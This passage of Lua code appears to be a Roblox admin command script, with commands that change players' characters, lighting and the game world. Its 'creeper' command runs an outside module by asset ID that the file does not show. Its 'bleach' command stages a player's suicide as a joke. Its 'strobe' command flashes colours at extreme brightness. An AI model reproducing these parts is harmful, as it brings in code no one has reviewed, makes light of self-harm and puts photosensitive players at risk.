		else
			speaker.Character.Fly.Speed.Value = args[1]
		end
	end)
	addCommand("noclip", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Character:FindFirstChild("DisableNoclip") then
					for i,v in pairs(Players[v].Character:GetChildren()) do
						if v.Name == "DisableNoclip" then
							v:Destroy()
						end
					end
				end
				wait()
				local DisableNoclip = Instance.new("RemoteFunction", Players[v].Character)
				DisableNoclip.Name = "DisableNoclip"
				local NoclipScript = Scripts.Noclip:Clone()
				NoclipScript.Disable.Value = DisableNoclip
				NoclipScript.Parent = Players[v].Character
				NoclipScript.Disabled = false
			end)
		end
	end)
	addCommand("clip", {'unnoclip'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].Character.DisableNoclip:InvokeClient(Players[v])
			end)
		end
	end)
	addCommand("togglenoclip", {'tnoclip'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Character:FindFirstChild("DisableNoclip") then
					for i,v in pairs(Players[v].Character:GetChildren()) do
						if v.Name == "DisableNoclip" then
							v:Destroy()
						end
					end
				else
					local DisableNoclip = Instance.new("RemoteFunction", Players[v].Character)
					DisableNoclip.Name = "DisableNoclip"
					local NoclipScript = Scripts.Noclip:Clone()
					NoclipScript.Disable.Value = DisableNoclip
					NoclipScript.Parent = Players[v].Character
					NoclipScript.Disabled = false
				end
			end)
		end
	end)
	addCommand("forcefield", {'ff'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local FF = Instance.new("ForceField", Players[v].Character)
			FF.Name = "BA_ForceField"
		end
	end)
	addCommand("unforcefield", {'unff','noff'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				for j,v1 in pairs(Players[v].Character:GetChildren()) do
					if v1.Name == "BA_ForceField" then
						v1:Destroy()
					end
				end
			end)
		end
	end)
	addCommand("god", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local Humanoid = Players[v].Character:FindFirstChildOfClass("Humanoid")
				local FF = Instance.new("ForceField", Players[v].Character)
				FF.Visible = false
				FF.Name = "BA_ForceField"
				Humanoid.MaxHealth = math.huge
				Humanoid.Health = math.huge
			end)
		end
	end)
	addCommand("ungod", {'nogod'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local Humanoid = Players[v].Character:FindFirstChildOfClass("Humanoid")
				Humanoid.MaxHealth = 100
				Humanoid.Health = 100
				for j,v1 in pairs(Players[v].Character:GetChildren()) do
					if v1.Name == "BA_ForceField" then
						v1:Destroy()
					end
				end
			end)
		end
	end)
	addCommand("invert", {}, function(args, speaker)
		local InvertEffect = Models.Invert:Clone()
		InvertEffect.Name = "BA_Invert"
		InvertEffect.Parent = Lighting
	end)
	addCommand("uninvert", {}, function(args, speaker)
		for i,v in pairs(Lighting:GetChildren()) do
			if v.Name == "BA_Invert" then
				v:Destroy()
			end
		end
	end)
	addCommand("nosky", {'removesky'}, function(args, speaker)
		for i,v in pairs(Lighting:GetChildren()) do
			if v:IsA("Sky") then
				v:Destroy()
			end
		end
	end)
	addCommand("noglobalshadows",{'nogshadows'}, function(args, speaker)
		Lighting.GlobalShadows = false
	end)
	addCommand("globalshadows",{'gshadows'}, function(args, speaker)
		Lighting.GlobalShadows = true
	end)
	addCommand("gravity", {}, function(args, speaker)
		Workspace.Gravity = args[1]
	end)
	addCommand("restoregravity", {'normalgravity','ngravity'}, function(args, speaker)
		Workspace.Gravity = 196.2
	end)
	addCommand("respawntime", {'retime'}, function(args, speaker)
		Players.RespawnTime = args[1]
	end)
	addCommand("spasm", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local plr = Players[v]
				local char = plr.Character
				while char and char.Parent do
					for _,v in pairs(char:GetDescendants()) do
						if v:IsA("Motor6D") then
							v.C0 = v.C0*CFrame.Angles(2*math.pi*math.random(),2*math.pi*math.random(),2*math.pi*math.random())
						end
					end
					wait()
				end
			end)
		end
	end)
	local function bleach(plr)
		spawn(function()
			Rig6(plr)
			local char = plr.Character
			local hit1 = Instance.new("Sound", workspace)
			hit1.SoundId = "http://roblox.com/asset?id=145486953"
			local hit = Instance.new("Sound", workspace)
			hit.SoundId = "http://roblox.com/asset?id=178646271"
			local Bleach = Instance.new("Part", char["Left Arm"])
			Bleach.CanCollide = false
			local Mesh = Instance.new("SpecialMesh", Bleach)
			Mesh.MeshId = "http://roblox.com/asset?id=483388971"
			Mesh.Scale = Vector3.new(0.005, 0.005, 0.005)
			Mesh.TextureId = "http://roblox.com/asset?id=520016684"
			local Handy = Instance.new("Weld", Bleach)
			Handy.Part0 = Bleach
			Handy.Part1 = char["Left Arm"]
			Handy.C0 = CFrame.new(0.5,1.8,0)
			Handy.C1 = CFrame.Angles(0,4,1)
			local drink = Instance.new("Sound", char.Head)
			drink.SoundId = "http://roblox.com/asset?id=10722059"
			wait(3)
			game.Chat:Chat(char.Head,"I need to die","Red")
			for i = 1,10 do
				wait()
				char.HumanoidRootPart.RootJoint.C0 = char.HumanoidRootPart.RootJoint.C0 * CFrame.Angles(-0.018,0,0)
				Handy.C0 = Handy.C0 * CFrame.new(-0.05,-0.07,0.09)
				Handy.C0 = Handy.C0 * CFrame.Angles(0.12,0,0)
				char.Torso["Left Shoulder"].C0 = char.Torso["Left Shoulder"].C0 * CFrame.Angles(0.2,0,-0.1)
			end
			drink:Play()
			wait(3.4)
			drink:Stop()
			for i = 1,10 do
				wait()
				char.HumanoidRootPart.RootJoint.C0 = char.HumanoidRootPart.RootJoint.C0 * CFrame.new(0,-0.50,0)
				char.HumanoidRootPart.RootJoint.C0 = char.HumanoidRootPart.RootJoint.C0 * CFrame.Angles(0.175,0,0)
				Handy.C0 = Handy.C0 * CFrame.new(0.05,0.07,-0.09)
				Handy.C0 = Handy.C0 * CFrame.Angles(-0.1,0,0)
				char.Torso["Left Shoulder"].C0 = char.Torso["Left Shoulder"].C0 * CFrame.Angles(-0.15,-0.04,0.2)
				char.Torso["Right Shoulder"].C0 = char.Torso["Right Shoulder"].C0 * CFrame.Angles(-0.05,0.03,0)
				char.Torso["Right Hip"].C0 = char.Torso["Right Hip"].C0 * CFrame.Angles(-0.02,0,0)
				char.Torso["Left Hip"].C0 = char.Torso["Left Hip"].C0 * CFrame.Angles(-0.01,0,0)
			end
			wait(0.01)
			char.Torso.Anchored = true
			char["Left Arm"].Anchored = true
			char["Right Arm"].Anchored = true
			char["Left Leg"].Anchored = true
			char["Right Leg"].Anchored = true
			char.Head.Anchored = true
			hit:Play()
			hit1:Play()
			wait(4)
			local bl00d = Instance.new("Part", char.Head)
			bl00d.Size = Vector3.new(0.1,0.1,0.1)
			bl00d.Rotation = Vector3.new(0,0,-90)
			bl00d.CanCollide = false
			bl00d.Anchored = true
			bl00d.BrickColor = BrickColor.new("Maroon")
			bl00d.Position = char.Head.Position
			bl00d.CFrame = bl00d.CFrame * CFrame.new(0.43,-0.65,0)
			bl00d.Shape = "Cylinder"
			bl00d.Material = "Pebble"
			for i = 1,100 do
				wait()
				bl00d.Size = bl00d.Size + Vector3.new(0,0.05,0.05)
			end
			wait(1)
			char:FindFirstChildOfClass('Humanoid').Health = 0
		end)
	end
	addCommand("bleach", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			bleach(Players[v])
		end
	end)
	addCommand("bomb", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local Char=Players[v].Character
				local HumanoidRootPart = Char.HumanoidRootPart
				local TickWait = 1
				local Dead = false

				local Position = Vector3.new(0,100,0)
				local function NewPart(Parent)
					local Part = Instance.new("Part", Parent)
					Part.CanCollide = false
					Part.Position = Position
					Part.TopSurface = "Smooth"
					Part.BottomSurface = "Smooth"
					Position = Position + Vector3.new(0,10,0)
					return Part
				end

				local Model = Char:FindFirstChild("Bomb")
				if Model then Model:Destroy() end

				local Model = Instance.new("Model", Char)
				Model.Name = "Bomb"

				local Belt = NewPart(Model)
				Belt.Size = Vector3.new(2.2,0.5,1.2)
				local Weld = Instance.new("Weld", Belt)
				Weld.Part0 = Belt
				Weld.Part1 = HumanoidRootPart
				Weld.C0 = CFrame.new(0,1.1,0)
				local Light = Instance.new("PointLight", Belt)
				Light.Range = 15
				Light.Brightness = 5
				Light.Color = Color3.new(1,0,0)
				local Beep = Instance.new("Sound", Belt)
				Beep.SoundId = "http://www.roblox.com/asset/?id=188588790"

				local Back = NewPart(Model)
				Back.Size = Vector3.new(1.5,1.5,0.5)
				local Weld = Instance.new("Weld", Back)
				Weld.Part0 = Back
				Weld.Part1 = HumanoidRootPart
				Weld.C0 = CFrame.new(0,0.1,-0.75)

				local StrapLeft = NewPart(Model)
				StrapLeft.Size = Vector3.new(0.2,0.5,1.6)
				local Weld = Instance.new("Weld", StrapLeft)
				Weld.Part0 = StrapLeft
				Weld.Part1 = HumanoidRootPart
				Weld.C0 = CFrame.new(0.65,-0.9,-0.2)

				local BuckleLeft = NewPart(Model)
				BuckleLeft.Size = Vector3.new(0.2,1.5,0.2)
				local Weld = Instance.new("Weld", BuckleLeft)
				Weld.Part0 = BuckleLeft
				Weld.Part1 = HumanoidRootPart
				Weld.C0 = CFrame.new(0.65,0.1,0.5)

				local StrapRight = NewPart(Model)
				StrapRight.Size = Vector3.new(0.2,0.5,1.6)
				local Weld = Instance.new("Weld", StrapRight)
				Weld.Part0 = StrapRight
				Weld.Part1 = HumanoidRootPart
				Weld.C0 = CFrame.new(-0.65,-0.9,-0.2)

				local BuckleRight = NewPart(Model)
				BuckleRight.Size = Vector3.new(0.2,1.5,0.2)
				local Weld = Instance.new("Weld", BuckleRight)
				Weld.Part0 = BuckleRight
				Weld.Part1 = HumanoidRootPart
				Weld.C0 = CFrame.new(-0.65,0.1,0.5)

				local LightEnabled = true
				local reeeeeee = coroutine.wrap(function()
					repeat
						wait(TickWait)
						LightEnabled = not LightEnabled
						Light.Enabled = LightEnabled
						Beep:Play()
					until Dead == true or Char:FindFirstChild("Bomb") == nil
				end)

				reeeeeee()

				wait(10)
				if Dead == false then
					Dead = true
					wait(1.4)
					local Explosion = Instance.new("Explosion")
					Explosion.Position = Belt.Position
					Explosion.BlastPressure = 100000
					Explosion.DestroyJointRadiusPercent = 0.7
					Explosion.ExplosionType = "CratersAndDebris"
					Explosion.BlastRadius = 50
					Explosion.Parent = workspace
				end
			end)
		end
	end)
	addCommand("cape", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Character:FindFirstChildOfClass("Humanoid") then
					local plr = Players[v]
					repeat wait() until plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
					local torso = plr.Character.HumanoidRootPart
					local p = Instance.new("Part", torso.Parent) p.Name = "BA_Cape" p.Anchored = false
					p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0
					p.Material = "SmoothPlastic"
					if not args[2] then
						p.Color = Color3.new(0,0,0)
						p.Color = Color3.new(0,0,0) else
						p.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
						p.Color = Color3.fromRGB((args[2]),(args[3]),(args[4])) end
					p.formFactor = "Custom"
					p.Size = Vector3.new(.2,.2,.2)
					local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
					local motor1 = Instance.new("Motor", p)
					motor1.Part0 = p
					motor1.Part1 = torso
					motor1.MaxVelocity = .01
					motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
					motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
					local wave = false
					repeat wait(1/44)
						local ang = 0.1
						local oldmag = torso.Velocity.magnitude
						local mv = .002
						if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
						ang = ang + math.min(torso.Velocity.magnitude/11, .5)
						motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
						motor1.DesiredAngle = -ang
						if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
						repeat wait(1/60) until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
						if torso.Velocity.magnitude < .1 then wait(.1) end
					until not p or p.Parent ~= torso.Parent
				end
			end)
		end
	end)
	addCommand("customcape", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Character:FindFirstChildOfClass("Humanoid") then
					local plr = Players[v]
					repeat wait() until plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
					local torso = plr.Character.HumanoidRootPart
					local p = Instance.new("Part", torso.Parent) p.Name = "BA_Cape" p.Anchored = false
					p.Color = Color3.fromRGB(0,0,0)
					p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0
					p.Material = "SmoothPlastic"
					local Image = Instance.new("Decal")
					Image.Parent = p
					Image.Face = "Back"
					Image.Texture = "http://www.roblox.com/asset/?id="..args[2]
					p.formFactor = "Custom"
					p.Size = Vector3.new(.2,.2,.2)
					local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
					local motor1 = Instance.new("Motor", p)
					motor1.Part0 = p
					motor1.Part1 = torso
					motor1.MaxVelocity = .01
					motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
					motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
					local wave = false
					repeat wait(1/44)
						local ang = 0.1
						local oldmag = torso.Velocity.magnitude
						local mv = .002
						if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
						ang = ang + math.min(torso.Velocity.magnitude/11, .5)
						motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
						motor1.DesiredAngle = -ang
						if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
						repeat wait(1/60) until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
						if torso.Velocity.magnitude < .1 then wait(.1) end
					until not p or p.Parent ~= torso.Parent
				end
			end)
		end
	end)
	addCommand("uncape", {'nocape'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local pchar=Players[v].Character
			for _, child in pairs( pchar:GetChildren()) do
				if child.Name == "BA_Cape" then
					child:Destroy()
				end
			end
		end
	end)
	addCommand("invisible", {'invis'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i, v in pairs(players) do
			for z, x in pairs(Players[v].Character:GetDescendants()) do
				if x:IsA("BasePart") or x:IsA("Decal") then
					x.Transparency = 1
				end
			end
		end
	end)
	addCommand("visible", {'vis'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i, v in pairs(players) do
			for z, x in pairs(Players[v].Character:GetDescendants()) do
				if x:IsA("BasePart") or x:IsA("Decal") then
					if x.Name ~= 'HumanoidRootPart' then
						x.Transparency = 0
					end
				end
			end
		end
	end)
	addCommand("ghost", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i, v in pairs(players) do
			for z, x in pairs(Players[v].Character:GetDescendants()) do
				if x:IsA("BasePart") or x:IsA("Decal") then
					if x.Name ~= 'HumanoidRootPart' then
						x.Transparency = 0.75
					end
				end
			end
		end
	end)
	addCommand("longneck", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Rig6(Players[v])
				local pchar=Players[v].Character
				for i,v in pairs(pchar:GetChildren()) do
					if pchar.Torso:FindFirstChild("Neck") then
						pchar.Torso.Neck.C0 = CFrame.new(0,3,0) * CFrame.Angles(-math.rad(90),0,math.rad(180))
						local Neck = pchar:FindFirstChild("Neck") if Neck then Neck:Destroy() end
						Neck = Instance.new("Part", pchar) Neck.Name = "Neck" Neck.Size = Vector3.new(1,3,1)
						Neck.Position = Vector3.new(0,100,0) Neck.BrickColor = BrickColor.new(tostring(pchar.Head.BrickColor)) Neck.Locked = true
						local Mesh = Instance.new("CylinderMesh", Neck) Mesh.Scale = Vector3.new(0.7,1,0.7)
						local Weld = Instance.new("Weld", Neck) Weld.Part0 = Neck Weld.Part1 = pchar.Torso Weld.C0 = CFrame.new(0,-2,0)
					end
				end
			end)
		end
	end)
	addCommand("unlongneck", {'nolongneck'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local pchar=Players[v].Character
				for i,v in pairs(pchar:GetChildren()) do
					pchar.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(-math.rad(90),0,math.rad(180))
					local Neck = pchar:FindFirstChild("Neck") 
					if Neck then 
						Neck:Destroy()
					end
				end
			end)
		end
	end)
	addCommand("time", {}, function(args, speaker)
		Lighting.ClockTime = args[1]
	end)
	addCommand("day", {}, function(args, speaker)
		Lighting.ClockTime = 14
	end)
	addCommand("night", {}, function(args, speaker)
		Lighting.ClockTime = 0
	end)
	local function weld(tab)
		local last = nil
		for i,v in pairs(tab) do
			if v:IsA("BasePart") then
				if last then
					local w = Instance.new("Weld",last)
					w.Part0 = w.Parent
					w.Part1 = v
					local pos = last.CFrame:toObjectSpace(v.CFrame)
					w.C0 = pos
				end
				last = v
			end
		end
	end
	addCommand("ball", {'hamsterball'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local pchar=Players[v].Character
			local scale = 10
			local function makeball(pos)
				local model = Instance.new("Model",workspace)
				model.Name = Players[v].Name .. "ball"
				local rand = BrickColor.Random()
				pchar.Head.Anchored = true
				for i=0,340,20 do
					wait()
					for z=-90,70,20 do
						local p = Instance.new("Part",model)
						p.formFactor = "Custom"
						p.BrickColor = rand
						p.Transparency = 0.5
						p.Size = Vector3.new(scale/5.5,scale/5.5,scale/140)
						p.Anchored = true
						p.TopSurface = 0
						p.BottomSurface = 0
						p.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(z),math.rad(i),0) * CFrame.new(0,0,-scale/2)
						p:breakJoints()
					end
				end
				weld(model:children())
				for i,v in pairs(model:children()) do v.Anchored = false end 
				pchar.Head.Anchored = false
				model:MakeJoints()
			end
			if pchar then
				makeball(pchar.HumanoidRootPart.Position+Vector3.new(0,scale/2-2.5,0))
			end
		end
	end)
	addCommand("unball", {'noball','nohamsterball','unhamsterball'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			for _, child in pairs( workspace:GetChildren()) do
				if child.Name == Players[v].Name .. "ball" then
					child:Destroy()
				end
			end
		end
	end)
	addCommand("rocket", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local pchar=Players[v].Character
			spawn(function()
				local missile = Instance.new('Part', workspace)
				missile.Name = 'IY_Missile'
				missile.CanCollide = false
				missile.Size = Vector3.new(2, 5, 2) 
				Instance.new('CylinderMesh', missile)
				local F = Instance.new('Part', missile)
				F.BrickColor = BrickColor.new('Black')
				F.CanCollide = false
				F.Size = Vector3.new(2, 0.2, 2)
				Instance.new('CylinderMesh', F)
				local fire = Instance.new('Fire', F)
				fire.Size = "15"
				fire.Heat = "25"
				local head = Instance.new('Part', missile)
				head.CanCollide = false
				head.Shape = 'Ball'
				head.Size = Vector3.new(2, 2, 2)
				head.TopSurface = 'Smooth'
				head.BottomSurface = 'Smooth'
				local BF = Instance.new('BodyForce', missile)
				BF.Name = 'force'
				BF.Force = Vector3.new(0, 0, 0)
				local W1 = Instance.new('Weld', missile)
				W1.Part0 = missile
				W1.Part1 = F
				W1.C1 = CFrame.new(0, 2.6, 0)
				local W2 = Instance.new('Weld', missile)
				W2.Part0 = missile
				W2.Part1 = head
				W2.C1 = CFrame.new(0, -2.6, 0)
				local W = Instance.new('Weld', missile)
				W.Part0 = W.Parent
				W.Part1 = pchar.HumanoidRootPart
				W.C1 = CFrame.new(0, 0.5, 1)
				missile.force.Force = Vector3.new(0, 15000, 0)
				wait(0.01)
				pchar.HumanoidRootPart.CFrame = pchar.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
				wait(5)
				Instance.new('Explosion', missile).Position = missile.Position
				wait(0.01)
				pchar:BreakJoints()
				wait(1)
				missile:destroy()
			end)
		end
	end)
	addCommand("duck", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local pchar = Players[v].Character
				local duck = Instance.new("SpecialMesh", pchar.HumanoidRootPart)
				duck.MeshType = "FileMesh"
				duck.MeshId = "http://www.roblox.com/asset/?id=9419831"
				duck.TextureId = "http://www.roblox.com/asset/?id=9419827"
				duck.Scale = Vector3.new(5, 5, 5)
				for k, v2 in pairs(Players[v].Character:GetDescendants()) do
					if v2:IsA("BasePart") or v2:IsA("Decal") then
						if v2.Name ~= 'HumanoidRootPart' then
							v2.Transparency = 1
						else
							v2.Transparency = 0
						end
					end
				end
			end)
		end
	end)
	addCommand("car", {'gokart'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local pchar=Players[v].Character
				local model = Models.Car:Clone()
				model.Parent = workspace
				model:MakeJoints()
				model:MoveTo(pchar.HumanoidRootPart.Position + Vector3.new(5, 5, 0))
				model.Name = "BA_Car" .. Players[v].Name wait(0.2)
				for _, child in pairs( model:GetChildren()) do
					if child.ClassName == "Part" then
						child.Anchored = true
						wait(1)
						child.Anchored = false
					end
				end
			end)
		end
	end)
	addCommand("uncar", {'nogokart','nocar'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			for _, child in pairs( workspace:GetChildren()) do
				if child.Name == "BA_Car" .. Players[v].Name then
					child:Destroy()
				end
			end
		end
	end)
	local strobeColours = {255, 0}
	local Strobe = false
	local StrobeP = nil
	addCommand("strobe", {'flash'}, function(args, speaker)
		if Strobe == false then
			StrobeP = Instance.new("ColorCorrectionEffect")
			StrobeP.Brightness = 1
			StrobeP.Parent = game:GetService("Lighting")
			Strobe = true
			StrobeP.Brightness = 100000000
			repeat wait(1/60)
				StrobeP.TintColor = Color3.fromRGB(strobeColours[math.random(1,#strobeColours)],strobeColours[math.random(1,#strobeColours)],strobeColours[math.random(1,#strobeColours)])
			until Strobe == false
		end
	end)
	addCommand("unstrobe", {'noflash','nostrobe','unflash'}, function(args, speaker)
		Strobe = false
		StrobeP:Destroy()
	end)
	addCommand("creeper", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			require(4813001798).creeper(Players[v].Name)
		end
	end)
	local function gull(name)
		spawn(function()
			local char = game:GetService("Players")[name].Character
			char.PrimaryPart = char.HumanoidRootPart

			local tors = game:GetService("Players")[name].Character.HumanoidRootPart
			local initCFrame = tors.CFrame

			if char:FindFirstChild("Torso") then
				char.Torso.Anchored = true
			else
				char.UpperTorso.Anchored = true
			end
			char:FindFirstChildOfClass("Humanoid").Name = "Sad"

			local gull = Instance.new("Part")
			gull.Anchored = true
			gull.CanCollide = false
			gull.Position = Vector3.new(0,100000,0)
			local mesh = Instance.new("SpecialMesh",gull)
			mesh.MeshId = "http://www.roblox.com/asset/?id=272501436"
			mesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
			mesh.Scale = Vector3.new(10,10,10)

			local leftWing = Instance.new("Part",gull)
			leftWing.CanCollide = false
			local lmesh = Instance.new("SpecialMesh",leftWing)
			lmesh.MeshId = "http://www.roblox.com/asset/?id=267684584"
			lmesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
			lmesh.Scale = Vector3.new(10,10,10)
			local leftMotor = Instance.new("Motor6D",gull)
			leftMotor.MaxVelocity = 1
			leftMotor.Part0 = gull
			leftMotor.Part1 = leftWing
			leftMotor.C0 = CFrame.new(-50.2919998, -0.0920021087, 0.280000001)

			local rightWing = Instance.new("Part",gull)
			rightWing.CanCollide = false
			local rmesh = Instance.new("SpecialMesh",rightWing)
			rmesh.MeshId = "http://www.roblox.com/asset/?id=267684651"
			rmesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
			rmesh.Scale = Vector3.new(10,10,10)
			local rightMotor = Instance.new("Motor6D",gull)
			rightMotor.MaxVelocity = 1
			rightMotor.Part0 = gull
			rightMotor.Part1 = rightWing
			rightMotor.C0 = CFrame.new(47.1930008, -0.0670021027, 0.280000001)

			local sound = Instance.new("Sound",gull)
			sound.SoundId = "rbxassetid://160877039"
			sound.Volume = 10
			gull.Parent = workspace

			for i = 400,-1000,-2 do
				local der = 0.02*i
				local angle = math.atan(der/1)
				gull.CFrame = initCFrame*CFrame.Angles(angle,math.pi,0) + initCFrame.lookVector * (i+5) + Vector3.new(0,0.01*i^2+7,0)
				if i == 0 then sound:Play() end
				if i <= 0 then
					char:SetPrimaryPartCFrame(gull.CFrame)
					local nextAngle = -0.2*math.sin(0.05*math.pi*(i))
					leftMotor.DesiredAngle = -nextAngle
					leftMotor.C0 = CFrame.new(-50.2919998, 47.193*math.tan(nextAngle), 0.280000001)
					rightMotor.DesiredAngle = nextAngle
					rightMotor.C0 = CFrame.new(47.1930008, 47.193*math.tan(nextAngle), 0.280000001)
				end
				wait()
			end

			local function KICK(P)
				spawn(function()
					if not FindInTable(Admin, P.Name) and not FindInTable(Owner, P.Name) then
						P:Kick('\n\n[Kicked from game]\n')
					end
				end)
			end

			if char:FindFirstChild("Torso") then
				char.Torso.Anchored = false
			else
				char.UpperTorso.Anchored = false
			end

			spawn(function()
				if game:GetService("Players")[name] == game:GetService("Players").LocalPlayer then wait(5) end
				game:GetService("Players")[name].CharacterAdded:Connect(function()
					wait()
					KICK(game:GetService("Players")[name])
				end)
				KICK(game:GetService("Players")[name])
			end)

			local go = Instance.new("BodyVelocity",gull)
			go.Velocity = Vector3.new(0,1000,0)
			go.MaxForce = Vector3.new(1000000,1000000,1000000)
			gull.Anchored = false
		end)
	end
	local function pipeTp(name,target)
		spawn(function()
			local pipe = Instance.new("Part")
			pipe.Name = "Pipe"
			pipe.Color = Color3.new(52/255,142/255,64/255)
			pipe.Size = Vector3.new(8,8,8)
			pipe.Anchored = true
			local mesh = Instance.new("SpecialMesh",pipe)
			mesh.MeshId = "rbxassetid://856736661"
			mesh.Scale = Vector3.new(0.15, 0.15, 0.15)
			local sound = Instance.new("Sound",pipe)
			sound.SoundId = "rbxassetid://864352897"
			sound.Volume = 1

			local targetpos = game:GetService("Players")[target].Character.HumanoidRootPart.CFrame

			local char = game:GetService("Players")[name].Character
			char.PrimaryPart = char.HumanoidRootPart
			if char:FindFirstChild("Torso") then
				char.Torso.Anchored = true
			else
				char.UpperTorso.Anchored = true
			end

			local torso = char.HumanoidRootPart
			local initPos = torso.CFrame

			pipe.Parent = workspace
			pipe.CFrame = initPos - Vector3.new(0,8,0)

			for i = 0,8,0.2 do
				pipe.CFrame = initPos - Vector3.new(0,8-i,0)
				if i >= 1 then char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,7,0)) end
				wait()
			end

			sound:Play()
			for i = 7,-8,-0.2 do
				char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,i,0))
				wait()
			end
			char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,-8,0))

			for i = 8,0,-0.2 do
				pipe.CFrame = initPos - Vector3.new(0,8-i,0)
				wait()
			end

			pipe.CFrame = targetpos - Vector3.new(0,8,0)
			char:SetPrimaryPartCFrame(pipe.CFrame)

			for i = 0,8,0.2 do
				pipe.CFrame = targetpos - Vector3.new(0,8-i,0)
				wait()
			end

			local played = false
			for i = -8,7,0.2 do
				if i >= 0 and not played then played = true sound:Play() end
				char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,i,0))
				wait()
			end
			char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,7,0))

			for i = 8,0,-0.2 do
				pipe.CFrame = targetpos - Vector3.new(0,8-i,0)
				if i >= 1 then char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,7,0)) end
				wait()
			end

			pipe:Destroy()

			if char:FindFirstChild("Torso") then
				char.Torso.Anchored = false
			else
				char.UpperTorso.Anchored = false
			end
		end)
	end
	addCommand("pipetp", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local target = getPlayers(args[2], speaker)[1]
		for i,v in pairs(players)do
			pipeTp(v,target)
		end
	end)
	addCommand("seagull", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			gull(Players[v].Name)
		end
	end)
	addCommand("sit", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].Character:FindFirstChildOfClass('Humanoid').Sit = true
			end)
		end
	end)
	addCommand("jump", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].Character:FindFirstChildOfClass('Humanoid').Jump = true
			end)
		end
	end)
	addCommand("light", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local pchar=Players[v].Character
				for j,v1 in pairs(pchar.HumanoidRootPart:GetChildren()) do
					if v1:IsA("PointLight") then
						v1:Destroy()
					end
				end
				local light = Instance.new("PointLight", pchar.HumanoidRootPart)
				light.Range = 12
				light.Brightness = 3
				if not args[2] then return end
